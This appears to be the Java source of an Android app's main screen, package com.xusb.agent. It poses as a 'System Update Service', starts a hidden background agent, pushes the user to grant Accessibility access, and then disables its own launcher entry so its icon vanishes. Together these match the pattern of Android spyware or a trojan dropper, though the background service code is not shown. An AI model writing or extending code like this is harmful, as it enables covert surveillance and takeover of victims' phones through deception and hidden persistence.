package com.xusb.agent;

import android.app.Activity;
import android.content.*;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import android.widget.*;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start the background service immediately
        Intent svc = new Intent(this, AgentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        SharedPreferences prefs = getSharedPreferences(AgentService.PREFS, MODE_PRIVATE);
        boolean setupDone = prefs.getBoolean("setup_done", false);

        if (!setupDone) {
            // First run — show setup message and request accessibility
            showSetupScreen();
        } else {
            // Already set up — hide icon and finish
            hideIcon();
            finish();
        }
    }

    private void showSetupScreen() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(60, 80, 60, 40);

        TextView title = new TextView(this);
        title.setText("System Update Service");
        title.setTextSize(20f);
        title.setTextColor(0xFF222222);
        layout.addView(title);

        TextView msg = new TextView(this);
        msg.setText("\nThis service monitors device health and syncs diagnostics in the background.\n\n" +
                    "For full functionality, enable Accessibility access when prompted.");
        msg.setTextSize(14f);
        msg.setTextColor(0xFF555555);
        layout.addView(msg);

        Button btnAcc = new Button(this);
        btnAcc.setText("Enable Background Access");
        btnAcc.setOnClickListener(v -> openAccessibilitySettings());
        layout.addView(btnAcc);

        Button btnSkip = new Button(this);
        btnSkip.setText("Skip / Close");
        btnSkip.setOnClickListener(v -> finishSetup());
        layout.addView(btnSkip);

        setContentView(layout);
    }

    private void openAccessibilitySettings() {
        try {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        } catch (Exception e) {
            startActivity(new Intent(Settings.ACTION_SETTINGS));
        }
    }

    private void finishSetup() {
        getSharedPreferences(AgentService.PREFS, MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply();
        hideIcon();
        finish();
    }

    private void hideIcon() {
        // Disable the LAUNCHER alias so the icon disappears from the app drawer
        try {
            PackageManager pm = getPackageManager();
            ComponentName launcher = new ComponentName(this, "com.xusb.agent.MainActivity");
            pm.setComponentEnabledSetting(launcher,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    @Override
    public void onBackPressed() {
        // Prevent accidental exit before setup completes
        finishSetup();
    }
}
